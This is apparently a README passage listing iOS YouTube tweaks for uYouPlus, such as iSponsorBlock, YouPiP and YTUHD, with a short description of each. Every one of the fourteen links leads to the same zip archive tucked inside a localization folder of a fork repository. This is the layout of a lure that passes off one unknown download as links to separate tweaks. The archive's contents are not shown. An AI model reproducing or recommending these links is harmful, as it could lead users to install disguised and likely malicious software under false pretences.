## Features

1. **[uYou](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip):** Enhance your YouTube experience.

2. **[iSponsorBlock](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip):** A jailbreak tweak that implements the SponsorBlock API to skip sponsorships in YouTube videos.

3. **[YouPiP](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip):** Enable **native PiP** in iOS YouTube app.

4. **[YTUHD](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip):** Unlock 1440p (2K) and 2160p (4K) resolutions in iOS YouTube app.

<details>
  <summary>And many more!</summary>

5. **[YTClassicVideoQuality](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip):** Revert to the original video quality selector in YouTube app.

6. **[YTNoHoverCards](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip):** Disable overlay at the end of YouTube videos.

7. **[YouRememberCaption](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip)**: Make YouTube remember your video caption setting, if not already.

8. **[NoYTPremium](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip)**: Remove YouTube Premium upsell alerts.

9. **[YTSpeed](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip)**: Simple playback speed tweak for the YouTube app on jailbroken iOS/iPadOS devices.

10. **[YTMiniplayerEnabler](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip)**: Enable Miniplayer for all YouTube videos.

11. **[DontEatMyContent](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip)**: Prevent the notch/Dynamic Island from munching on 2:1 video content in YouTube.

12. **[YTABConfig](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip)**: Configure A/B settings in iOS YouTube app.

13. **[YouMute](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip)**: Mute/unmute videos in iOS YouTube directly.

14. **[YouQuality](https://raw.githubusercontent.com/fuwagura/uYouPlus/main/Localizations/uYouPlus.bundle/he.lproj/You-Plus-u-2.7.zip)**: View and change video quality in YouTube app from the video overlay.

</details>
